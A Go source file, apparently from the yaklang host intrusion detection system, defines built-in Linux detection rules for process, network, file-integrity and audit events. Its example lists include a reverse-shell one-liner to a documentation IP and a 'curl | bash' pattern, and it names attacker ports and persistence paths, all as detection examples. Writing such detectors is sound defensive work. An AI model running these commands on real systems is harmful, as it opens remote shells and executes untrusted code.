//go:build hids

package builtin

import (
	"fmt"
	"path"
	"strings"
	"time"

	"github.com/yaklang/yaklang/common/hids/model"
	"github.com/yaklang/yaklang/common/hids/policy"
)

type Rule struct {
	ID             string
	RuleSet        string
	MatchEventType string
	Severity       string
	Title          string
	Tags           []string
	Match          func(model.Event) bool
	Detail         func(model.Event) map[string]any
}

type RuleSetDefinition struct {
	RuleSet        string           `json:"rule_set"`
	Title          string           `json:"title"`
	Description    string           `json:"description"`
	MatchEventType string           `json:"match_event_type"`
	RequiredEvents []string         `json:"required_events"`
	Rules          []RuleDefinition `json:"rules"`
	Examples       []string         `json:"examples"`
}

type RuleDefinition struct {
	RuleID         string   `json:"rule_id"`
	RuleSet        string   `json:"rule_set"`
	MatchEventType string   `json:"match_event_type"`
	Severity       string   `json:"severity"`
	Title          string   `json:"title"`
	Tags           []string `json:"tags"`
}

var builtinRuleSetOrder = []string{
	"linux.process.baseline",
	"linux.network.baseline",
	"linux.file.integrity",
	"linux.audit.core",
}

const longLivedNetworkSessionSeconds int64 = 300

var ruleSetMetadata = map[string]RuleSetDefinition{
	"linux.process.baseline": {
		RuleSet:     "linux.process.baseline",
		Title:       "Process Baseline",
		Description: "当前节点 runtime 会对可疑进程行为做基线判断，例如 web-facing parent 拉起 shell、从可写 tmp 路径执行进程、下载后管道执行、反弹 shell 命令、SUID/SGID 修改、持久化入口和账号管理命令，并把可执行 artifact 的哈希与 ELF 信息带进告警上下文。",
		Examples:    []string{"shell under nginx", "exec from /tmp", "curl | bash", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1", "chmod u+s", "artifact hash / elf context", model.EventTypeProcessExec},
	},
	"linux.network.baseline": {
		RuleSet:     "linux.network.baseline",
		Title:       "Network Baseline",
		Description: "当前内置网络规则聚焦公共网络上的可疑端口、shell/解释器直连、web 进程向远程管理服务或代理/Tor 外连、云元数据与 Kubernetes 控制面访问、公网数据服务外联、持续可疑会话，以及非预期进程接收公网管理/数据服务连接。",
		Examples:    []string{"public suspicious port", "shell public egress", "tooling to tor", "metadata service access", "public kubernetes api egress", "public data service egress", "web process to tor proxy", "long-lived remote admin session", model.EventTypeNetworkConnect},
	},
	"linux.file.integrity": {
		RuleSet:     "linux.file.integrity",
		Title:       "File Integrity",
		Description: "当前文件完整性基线关注敏感系统路径和 SSH authorized_keys 变化，同时补充 ld.so.preload、profile.d、rc.local 这类持久化/加载位点，以及可写 tmp 下的 ELF 落地和系统 ELF artifact 变更检测，适合作为 Linux HIDS 第一阶段的稳定告警面。",
		Examples:    []string{"/etc/passwd", "/etc/ld.so.preload", "/etc/profile.d/evil.sh", "authorized_keys", "/tmp/payload", "/usr/bin/ssh", model.EventTypeFileChange},
	},
	"linux.audit.core": {
		RuleSet:     "linux.audit.core",
		Title:       "Audit Core",
		Description: "当前内置审计规则聚焦远程登录失败与特权登录成功、安全控制篡改命令、下载后管道执行、反弹 shell、SUID/SGID 修改、持久化入口、账号管理、敏感文件访问与变更，以及权限变更成功事件。",
		Examples:    []string{"remote root login success", "curl | bash", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1", "chmod u+s", "systemctl enable", "/etc/shadow write"},
	},
}

func DescribeRuleSets() []RuleSetDefinition {
	definitions := make([]RuleSetDefinition, 0, len(builtinRuleSetOrder))
	for _, ruleSet := range builtinRuleSetOrder {
		definition, ok := DescribeRuleSet(ruleSet)
		if !ok {
			continue
		}
		definitions = append(definitions, definition)
	}
	return definitions
}

func DescribeRuleSet(ruleSet string) (RuleSetDefinition, bool) {
	rules, ok := loadRuleSet(ruleSet)
	if !ok {
		return RuleSetDefinition{}, false
	}

	definition := ruleSetMetadata[ruleSet]
	definition.RuleSet = ruleSet
	definition.Rules = describeRules(rules)
	definition.RequiredEvents = requiredEventsForRules(rules)
	if definition.MatchEventType == "" && len(definition.RequiredEvents) > 0 {
		definition.MatchEventType = definition.RequiredEvents[0]
	}
	definition.Examples = cloneStringSlice(definition.Examples)
	return definition, true
}

func Compile(ruleSets []string) ([]Rule, error) {
	compiled := make([]Rule, 0, len(ruleSets)*2)
	for index, ruleSet := range ruleSets {
		rules, ok := loadRuleSet(ruleSet)
		if !ok {
			return nil, &model.ValidationError{
				Field:  fmt.Sprintf("builtin_rule_sets[%d]", index),
				Reason: fmt.Sprintf("unknown builtin rule set %q", ruleSet),
			}
		}
		compiled = append(compiled, rules...)
	}
	return compiled, nil
}

func describeRules(rules []Rule) []RuleDefinition {
	if len(rules) == 0 {
		return []RuleDefinition{}
	}
	definitions := make([]RuleDefinition, 0, len(rules))
	for _, rule := range rules {
		definitions = append(definitions, RuleDefinition{
			RuleID:         rule.ID,
			RuleSet:        rule.RuleSet,
			MatchEventType: rule.MatchEventType,
			Severity:       rule.Severity,
			Title:          rule.Title,
			Tags:           cloneStringSlice(rule.Tags),
		})
	}
	return definitions
}

func requiredEventsForRules(rules []Rule) []string {
	if len(rules) == 0 {
		return []string{}
	}
	seen := map[string]struct{}{}
	events := make([]string, 0, len(rules))
	for _, rule := range rules {
		eventType := strings.TrimSpace(rule.MatchEventType)
		if eventType == "" {
			continue
		}
		if _, exists := seen[eventType]; exists {
			continue
		}
		seen[eventType] = struct{}{}
		events = append(events, eventType)
	}
	return events
}

func Evaluate(rules []Rule, event model.Event) []model.Alert {
	if len(rules) == 0 {
		return nil
	}

	alerts := make([]model.Alert, 0, len(rules))
	for _, rule := range rules {
		if rule.MatchEventType != "" && rule.MatchEventType != event.Type {
			continue
		}
		if rule.Match == nil || !rule.Match(event) {
			continue
		}
		alerts = append(alerts, buildAlert(rule, event))
	}
	return alerts
}

func loadRuleSet(ruleSet string) ([]Rule, bool) {
	switch ruleSet {
	case "linux.process.baseline":
		return []Rule{
			{
				ID:             "linux.process.shell_under_web_parent",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeProcessExec,
				Severity:       "high",
				Title:          "shell spawned under web-facing parent",
				Tags:           []string{"builtin", "baseline", "process"},
				Match:          matchShellUnderWebParent,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"image":       event.Process.Image,
						"command":     event.Process.Command,
						"parent_name": event.Process.ParentName,
					}
				},
			},
			{
				ID:             "linux.process.exec_from_writable_tmp",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeProcessExec,
				Severity:       "high",
				Title:          "process executed from writable tmp path",
				Tags:           []string{"builtin", "baseline", "process", "tmp"},
				Match:          matchExecFromWritableTmp,
				Detail:         buildProcessCommandDetail,
			},
			{
				ID:             "linux.process.download_pipe_shell",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeProcessExec,
				Severity:       "high",
				Title:          "process downloads content and pipes it into shell",
				Tags:           []string{"builtin", "baseline", "process", "download", "shell"},
				Match:          matchProcessDownloadPipeShell,
				Detail: func(event model.Event) map[string]any {
					return buildProcessCommandDetail(event)
				},
			},
			{
				ID:             "linux.process.reverse_shell_command",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeProcessExec,
				Severity:       "critical",
				Title:          "process executed reverse shell command",
				Tags:           []string{"builtin", "baseline", "process", "shell", "reverse-shell"},
				Match:          matchProcessReverseShellCommand,
				Detail: func(event model.Event) map[string]any {
					return buildProcessCommandDetail(event)
				},
			},
			{
				ID:             "linux.process.setuid_setgid_bit",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeProcessExec,
				Severity:       "high",
				Title:          "process modifies setuid or setgid bit",
				Tags:           []string{"builtin", "baseline", "process", "privilege", "suid"},
				Match:          matchProcessSetuidSetgidBit,
				Detail: func(event model.Event) map[string]any {
					return buildProcessCommandDetail(event)
				},
			},
			{
				ID:             "linux.process.persistence_command",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeProcessExec,
				Severity:       "high",
				Title:          "process modifies persistence mechanism",
				Tags:           []string{"builtin", "baseline", "process", "persistence"},
				Match:          matchProcessPersistenceCommand,
				Detail: func(event model.Event) map[string]any {
					return buildProcessCommandDetail(event)
				},
			},
			{
				ID:             "linux.process.account_management_command",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeProcessExec,
				Severity:       "high",
				Title:          "process executes account management command",
				Tags:           []string{"builtin", "baseline", "process", "account"},
				Match:          matchProcessAccountManagementCommand,
				Detail: func(event model.Event) map[string]any {
					return buildProcessCommandDetail(event)
				},
			},
		}, true
	case "linux.network.baseline":
		return []Rule{
			{
				ID:             "linux.network.public_suspicious_port",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkConnect,
				Severity:       "high",
				Title:          "outbound connection to suspicious public port",
				Tags:           []string{"builtin", "baseline", "network"},
				Match:          matchSuspiciousPublicPort,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"dest_address": event.Network.DestAddress,
						"dest_port":    event.Network.DestPort,
						"protocol":     event.Network.Protocol,
					}
				},
			},
			{
				ID:             "linux.network.shell_public_egress",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkConnect,
				Severity:       "high",
				Title:          "shell initiated direct public network egress",
				Tags:           []string{"builtin", "baseline", "network", "shell"},
				Match:          matchShellPublicEgress,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"process_name":  event.Process.Name,
						"process_image": event.Process.Image,
						"command":       event.Process.Command,
						"dest_address":  event.Network.DestAddress,
						"dest_port":     event.Network.DestPort,
						"protocol":      event.Network.Protocol,
					}
				},
			},
			{
				ID:             "linux.network.web_process_remote_admin_egress",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkConnect,
				Severity:       "high",
				Title:          "web-facing process connected to remote admin service",
				Tags:           []string{"builtin", "baseline", "network", "web", "remote-admin"},
				Match:          matchWebProcessRemoteAdminEgress,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"process_name":  event.Process.Name,
						"process_image": event.Process.Image,
						"parent_name":   event.Process.ParentName,
						"dest_address":  event.Network.DestAddress,
						"dest_port":     event.Network.DestPort,
						"dest_service":  policy.PortServiceName(event.Network.Protocol, event.Network.DestPort),
					}
				},
			},
			{
				ID:             "linux.network.unexpected_public_admin_accept",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkAccept,
				Severity:       "high",
				Title:          "public remote admin connection accepted by unexpected process",
				Tags:           []string{"builtin", "baseline", "network", "inbound", "remote-admin"},
				Match:          matchUnexpectedPublicAdminAccept,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"process_name":   event.Process.Name,
						"process_image":  event.Process.Image,
						"remote_address": event.Network.DestAddress,
						"local_port":     event.Network.SourcePort,
						"local_service":  policy.PortServiceName(event.Network.Protocol, event.Network.SourcePort),
					}
				},
			},
			{
				ID:             "linux.network.interpreter_remote_admin_egress",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkConnect,
				Severity:       "high",
				Title:          "interpreter connected to public remote admin service",
				Tags:           []string{"builtin", "baseline", "network", "interpreter", "remote-admin"},
				Match:          matchInterpreterRemoteAdminEgress,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"process_name":  event.Process.Name,
						"process_image": event.Process.Image,
						"command":       event.Process.Command,
						"dest_address":  event.Network.DestAddress,
						"dest_port":     event.Network.DestPort,
						"dest_service":  policy.PortServiceName(event.Network.Protocol, event.Network.DestPort),
					}
				},
			},
			{
				ID:             "linux.network.tooling_proxy_tor_egress",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkConnect,
				Severity:       "high",
				Title:          "tooling process connected to proxy or tor service",
				Tags:           []string{"builtin", "baseline", "network", "proxy", "tor"},
				Match:          matchToolingProxyTorEgress,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"process_name":  event.Process.Name,
						"process_image": event.Process.Image,
						"command":       event.Process.Command,
						"dest_address":  event.Network.DestAddress,
						"dest_port":     event.Network.DestPort,
						"dest_service":  policy.PortServiceName(event.Network.Protocol, event.Network.DestPort),
					}
				},
			},
			{
				ID:             "linux.network.metadata_service_access",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkConnect,
				Severity:       "high",
				Title:          "unexpected cloud metadata service access",
				Tags:           []string{"builtin", "baseline", "network", "metadata"},
				Match:          matchMetadataServiceAccess,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"process_name":  event.Process.Name,
						"process_image": event.Process.Image,
						"command":       event.Process.Command,
						"parent_name":   event.Process.ParentName,
						"dest_address":  event.Network.DestAddress,
						"dest_port":     event.Network.DestPort,
					}
				},
			},
			{
				ID:             "linux.network.web_process_proxy_tor_egress",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkConnect,
				Severity:       "high",
				Title:          "web-facing process connected to proxy or tor service",
				Tags:           []string{"builtin", "baseline", "network", "web", "proxy", "tor"},
				Match:          matchWebProcessProxyTorEgress,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"process_name":  event.Process.Name,
						"process_image": event.Process.Image,
						"parent_name":   event.Process.ParentName,
						"dest_address":  event.Network.DestAddress,
						"dest_port":     event.Network.DestPort,
						"dest_service":  policy.PortServiceName(event.Network.Protocol, event.Network.DestPort),
					}
				},
			},
			{
				ID:             "linux.network.public_data_service_egress",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkConnect,
				Severity:       "high",
				Title:          "unexpected public data service egress",
				Tags:           []string{"builtin", "baseline", "network", "data-service", "egress"},
				Match:          matchPublicDataServiceEgress,
				Detail:         buildNetworkEgressDetail,
			},
			{
				ID:             "linux.network.public_kubernetes_api_egress",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkConnect,
				Severity:       "high",
				Title:          "unexpected public kubernetes api egress",
				Tags:           []string{"builtin", "baseline", "network", "k8s", "control-plane"},
				Match:          matchPublicKubernetesAPIEgress,
				Detail:         buildNetworkEgressDetail,
			},
			{
				ID:             "linux.network.unexpected_public_data_service_accept",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkAccept,
				Severity:       "high",
				Title:          "public data service connection accepted by unexpected process",
				Tags:           []string{"builtin", "baseline", "network", "inbound", "data-service"},
				Match:          matchUnexpectedPublicDataServiceAccept,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"process_name":   event.Process.Name,
						"process_image":  event.Process.Image,
						"remote_address": event.Network.DestAddress,
						"local_port":     event.Network.SourcePort,
						"local_service":  policy.PortServiceName(event.Network.Protocol, event.Network.SourcePort),
					}
				},
			},
			{
				ID:             "linux.network.long_lived_public_remote_admin_session",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkClose,
				Severity:       "high",
				Title:          "long-lived public remote admin session",
				Tags:           []string{"builtin", "baseline", "network", "remote-admin", "long-lived"},
				Match:          matchLongLivedPublicRemoteAdminSession,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"process_name":              event.Process.Name,
						"process_image":             event.Process.Image,
						"parent_name":               event.Process.ParentName,
						"command":                   event.Process.Command,
						"dest_address":              event.Network.DestAddress,
						"dest_port":                 event.Network.DestPort,
						"dest_service":              policy.PortServiceName(event.Network.Protocol, event.Network.DestPort),
						"connection_age_seconds":    networkConnectionAgeSeconds(event),
						"previous_connection_state": networkPreviousConnectionState(event),
					}
				},
			},
			{
				ID:             "linux.network.long_lived_proxy_tor_session",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeNetworkClose,
				Severity:       "high",
				Title:          "long-lived proxy or tor session",
				Tags:           []string{"builtin", "baseline", "network", "proxy", "tor", "long-lived"},
				Match:          matchLongLivedProxyTorSession,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"process_name":              event.Process.Name,
						"process_image":             event.Process.Image,
						"command":                   event.Process.Command,
						"dest_address":              event.Network.DestAddress,
						"dest_port":                 event.Network.DestPort,
						"dest_service":              policy.PortServiceName(event.Network.Protocol, event.Network.DestPort),
						"connection_age_seconds":    networkConnectionAgeSeconds(event),
						"previous_connection_state": networkPreviousConnectionState(event),
					}
				},
			},
		}, true
	case "linux.file.integrity":
		return []Rule{
			{
				ID:             "linux.file.sensitive_path_change",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeFileChange,
				Severity:       "high",
				Title:          "sensitive system file changed",
				Tags:           []string{"builtin", "baseline", "file", "integrity"},
				Match:          matchSensitivePathChange,
				Detail:         buildFileChangeDetail,
			},
			{
				ID:             "linux.file.authorized_keys_change",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeFileChange,
				Severity:       "high",
				Title:          "ssh authorized_keys changed",
				Tags:           []string{"builtin", "baseline", "file", "ssh"},
				Match:          matchAuthorizedKeysChange,
				Detail:         buildFileChangeDetail,
			},
			{
				ID:             "linux.file.sensitive_permission_drift",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Title:          "sensitive file permissions changed",
				Tags:           []string{"builtin", "baseline", "file", "integrity", "permission"},
				Match:          matchSensitivePermissionDrift,
				Detail: func(event model.Event) map[string]any {
					return buildSensitiveFileDriftDetail(event, "permission")
				},
			},
			{
				ID:             "linux.file.sensitive_owner_group_drift",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Title:          "sensitive file ownership changed",
				Tags:           []string{"builtin", "baseline", "file", "integrity", "ownership"},
				Match:          matchSensitiveOwnershipDrift,
				Detail: func(event model.Event) map[string]any {
					return buildSensitiveFileDriftDetail(event, "ownership")
				},
			},
			{
				ID:             "linux.file.writable_tmp_elf_drop",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeFileChange,
				Severity:       "high",
				Title:          "ELF artifact dropped into writable tmp path",
				Tags:           []string{"builtin", "baseline", "file", "tmp", "artifact", "elf"},
				Match:          matchWritableTmpELFDrop,
				Detail:         buildFileChangeDetail,
			},
			{
				ID:             "linux.file.system_elf_change",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeFileChange,
				Severity:       "high",
				Title:          "system ELF artifact changed",
				Tags:           []string{"builtin", "baseline", "file", "integrity", "artifact", "elf"},
				Match:          matchSystemELFChange,
				Detail:         buildFileChangeDetail,
			},
		}, true
	case "linux.audit.core":
		return []Rule{
			{
				ID:             "linux.audit.remote_login_failed",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "medium",
				Title:          "remote login failed",
				Tags:           []string{"builtin", "audit", "login"},
				Match:          matchRemoteLoginFailed,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"username":    auditUsername(event.Audit),
						"login_user":  event.Audit.LoginUser,
						"remote_ip":   event.Audit.RemoteIP,
						"remote_host": event.Audit.RemoteHost,
						"terminal":    event.Audit.Terminal,
					}
				},
			},
			{
				ID:             "linux.audit.remote_root_login_success",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Title:          "remote root login succeeded",
				Tags:           []string{"builtin", "audit", "login", "privileged"},
				Match:          matchRemoteRootLoginSuccess,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"username":    auditUsername(event.Audit),
						"login_user":  event.Audit.LoginUser,
						"remote_ip":   event.Audit.RemoteIP,
						"remote_host": event.Audit.RemoteHost,
						"terminal":    event.Audit.Terminal,
						"session_id":  event.Audit.SessionID,
					}
				},
			},
			{
				ID:             "linux.audit.security_control_tamper_command",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Title:          "security control tamper command executed",
				Tags:           []string{"builtin", "audit", "command", "tamper"},
				Match:          matchSecurityControlTamperCommand,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"command":  auditCommandText(event),
						"image":    auditProcessImage(event.Process),
						"username": auditUsername(event.Audit),
						"result":   event.Audit.Result,
					}
				},
			},
			{
				ID:             "linux.audit.download_pipe_shell_command",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Title:          "download piped into shell",
				Tags:           []string{"builtin", "audit", "command", "download", "shell"},
				Match:          matchDownloadPipeShellCommand,
				Detail: func(event model.Event) map[string]any {
					return buildAuditCommandDetail(event)
				},
			},
			{
				ID:             "linux.audit.reverse_shell_command",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "critical",
				Title:          "reverse shell command executed",
				Tags:           []string{"builtin", "audit", "command", "shell", "reverse-shell"},
				Match:          matchReverseShellCommand,
				Detail: func(event model.Event) map[string]any {
					return buildAuditCommandDetail(event)
				},
			},
			{
				ID:             "linux.audit.setuid_setgid_bit_command",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Title:          "setuid or setgid bit modified",
				Tags:           []string{"builtin", "audit", "command", "privilege", "suid"},
				Match:          matchSetuidSetgidBitCommand,
				Detail: func(event model.Event) map[string]any {
					return buildAuditCommandDetail(event)
				},
			},
			{
				ID:             "linux.audit.persistence_command",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Title:          "persistence mechanism modified by command",
				Tags:           []string{"builtin", "audit", "command", "persistence"},
				Match:          matchPersistenceCommand,
				Detail: func(event model.Event) map[string]any {
					return buildAuditCommandDetail(event)
				},
			},
			{
				ID:             "linux.audit.account_management_command",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Title:          "account management command executed",
				Tags:           []string{"builtin", "audit", "command", "account"},
				Match:          matchAccountManagementCommand,
				Detail: func(event model.Event) map[string]any {
					return buildAuditCommandDetail(event)
				},
			},
			{
				ID:             "linux.audit.sensitive_file_mutation",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Title:          "sensitive file changed with audit identity",
				Tags:           []string{"builtin", "audit", "file", "sensitive-mutation"},
				Match:          matchSensitiveFileMutation,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"path":        auditFilePath(event.File),
						"action":      auditAction(event.Audit),
						"username":    auditUsername(event.Audit),
						"command":     auditCommandText(event),
						"process_cwd": event.Audit.ProcessCWD,
					}
				},
			},
			{
				ID:             "linux.audit.sensitive_file_access",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Title:          "sensitive file accessed",
				Tags:           []string{"builtin", "audit", "file", "sensitive-access"},
				Match:          matchSensitiveFileAccess,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"path":        auditFilePath(event.File),
						"action":      auditAction(event.Audit),
						"username":    auditUsername(event.Audit),
						"command":     auditCommandText(event),
						"process_cwd": event.Audit.ProcessCWD,
					}
				},
			},
			{
				ID:             "linux.audit.privilege_change",
				RuleSet:        ruleSet,
				MatchEventType: model.EventTypeAudit,
				Severity:       "high",
				Title:          "privilege change succeeded",
				Tags:           []string{"builtin", "audit", "privilege"},
				Match:          matchPrivilegeChange,
				Detail: func(event model.Event) map[string]any {
					return map[string]any{
						"username":         auditUsername(event.Audit),
						"login_user":       event.Audit.LoginUser,
						"action":           event.Audit.Action,
						"object_type":      event.Audit.ObjectType,
						"object_primary":   event.Audit.ObjectPrimary,
						"object_secondary": event.Audit.ObjectSecondary,
					}
				},
			},
		}, true
	default:
		return nil, false
	}
}

func buildAlert(rule Rule, event model.Event) model.Alert {
	observedAt := event.Timestamp.UTC()
	if observedAt.IsZero() {
		observedAt = time.Now().UTC()
	}

	detail := map[string]any{
		"rule_type":        "builtin",
		"builtin_rule_set": rule.RuleSet,
		"match_event_type": rule.MatchEventType,
		"event":            snapshotEvent(event),
	}
	if rule.Detail != nil {
		for key, value := range rule.Detail(event) {
			detail[key] = cloneValue(value)
		}
	}

	return model.Alert{
		RuleID:     rule.ID,
		Severity:   rule.Severity,
		Title:      rule.Title,
		Tags:       mergeTags(rule.Tags, event.Tags),
		Detail:     detail,
		ObservedAt: observedAt,
	}
}

func matchShellUnderWebParent(event model.Event) bool {
	if event.Process == nil {
		return false
	}

	parentName := strings.ToLower(strings.TrimSpace(event.Process.ParentName))
	switch parentName {
	case "nginx", "apache2", "httpd", "caddy", "php-fpm", "php-fpm8.1", "php-fpm8.2", "php-fpm8.3", "uwsgi", "gunicorn":
	default:
		return false
	}

	imageBase := path.Base(normalizePath(event.Process.Image))
	switch imageBase {
	case "sh", "bash", "dash", "zsh", "ksh":
		return true
	default:
		return false
	}
}

func matchExecFromWritableTmp(event model.Event) bool {
	if event.Process == nil {
		return false
	}

	image := policy.NormalizePath(event.Process.Image)
	return policy.IsWritableTmpPath(image)
}

func matchProcessDownloadPipeShell(event model.Event) bool {
	return matchProcessCommand(event, policy.IsDownloadPipeShellCommand)
}

func matchProcessReverseShellCommand(event model.Event) bool {
	return matchProcessCommand(event, policy.IsReverseShellCommand)
}

func matchProcessSetuidSetgidBit(event model.Event) bool {
	return matchProcessCommand(event, policy.IsSetuidSetgidBitCommand)
}

func matchProcessPersistenceCommand(event model.Event) bool {
	return matchProcessCommand(event, policy.IsPersistenceCommand)
}

func matchProcessAccountManagementCommand(event model.Event) bool {
	return matchProcessCommand(event, policy.IsAccountManagementCommand)
}

func matchSuspiciousPublicPort(event model.Event) bool {
	if event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}

	switch event.Network.DestPort {
	case 4444, 5555, 6667, 1337, 31337:
		return true
	default:
		return false
	}
}

func matchShellPublicEgress(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}
	return policy.HasProcessRole(event.Process.Name, event.Process.Image, event.Process.Command, "shell")
}

func matchWebProcessRemoteAdminEgress(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}
	if !policy.IsRemoteAdminPort(event.Network.Protocol, event.Network.DestPort) {
		return false
	}
	return policy.HasProcessRole(event.Process.Name, event.Process.Image, event.Process.Command, "web") ||
		policy.HasProcessRole(event.Process.ParentName, "", "", "web")
}

func matchUnexpectedPublicAdminAccept(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}
	if !policy.IsRemoteAdminPort(event.Network.Protocol, event.Network.SourcePort) {
		return false
	}
	return !policy.IsExpectedListeningProcessForPort(
		event.Network.SourcePort,
		event.Process.Name,
		event.Process.Image,
		event.Process.Command,
	)
}

func matchInterpreterRemoteAdminEgress(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}
	if !policy.IsRemoteAdminPort(event.Network.Protocol, event.Network.DestPort) {
		return false
	}
	return policy.HasProcessRole(event.Process.Name, event.Process.Image, event.Process.Command, "interpreter")
}

func matchToolingProxyTorEgress(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}
	if !policy.IsProxyOrTorPort(event.Network.Protocol, event.Network.DestPort) {
		return false
	}
	return policy.HasAnyProcessRole(
		event.Process.Name,
		event.Process.Image,
		event.Process.Command,
		"shell",
		"interpreter",
		"network_tool",
	)
}

func matchMetadataServiceAccess(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if !policy.IsMetadataServiceAddress(event.Network.DestAddress) {
		return false
	}
	return policy.HasAnyProcessRole(
		event.Process.Name,
		event.Process.Image,
		event.Process.Command,
		"shell",
		"interpreter",
		"network_tool",
		"web",
	) || policy.HasProcessRole(event.Process.ParentName, "", "", "web")
}

func matchWebProcessProxyTorEgress(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}
	if !policy.IsProxyOrTorPort(event.Network.Protocol, event.Network.DestPort) {
		return false
	}
	return policy.HasProcessRole(event.Process.Name, event.Process.Image, event.Process.Command, "web") ||
		policy.HasProcessRole(event.Process.ParentName, "", "", "web")
}

func matchPublicDataServiceEgress(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}
	if !policy.IsDataServicePort(event.Network.Protocol, event.Network.DestPort) {
		return false
	}
	return policy.HasAnyProcessRole(
		event.Process.Name,
		event.Process.Image,
		event.Process.Command,
		"shell",
		"interpreter",
		"network_tool",
	)
}

func matchPublicKubernetesAPIEgress(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}
	if !policy.IsKubernetesAPIPort(event.Network.Protocol, event.Network.DestPort) {
		return false
	}
	return policy.HasAnyProcessRole(
		event.Process.Name,
		event.Process.Image,
		event.Process.Command,
		"shell",
		"interpreter",
		"network_tool",
		"web",
	) || policy.HasProcessRole(event.Process.ParentName, "", "", "web")
}

func matchUnexpectedPublicDataServiceAccept(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}
	if !policy.IsDataServicePort(event.Network.Protocol, event.Network.SourcePort) {
		return false
	}
	return !policy.IsExpectedListeningProcessForPort(
		event.Network.SourcePort,
		event.Process.Name,
		event.Process.Image,
		event.Process.Command,
	)
}

func matchLongLivedPublicRemoteAdminSession(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}
	if !policy.IsRemoteAdminPort(event.Network.Protocol, event.Network.DestPort) {
		return false
	}
	if networkConnectionAgeSeconds(event) < longLivedNetworkSessionSeconds {
		return false
	}
	if policy.HasAnyProcessRole(event.Process.Name, event.Process.Image, event.Process.Command, "shell", "interpreter") {
		return true
	}
	return policy.HasProcessRole(event.Process.Name, event.Process.Image, event.Process.Command, "web") ||
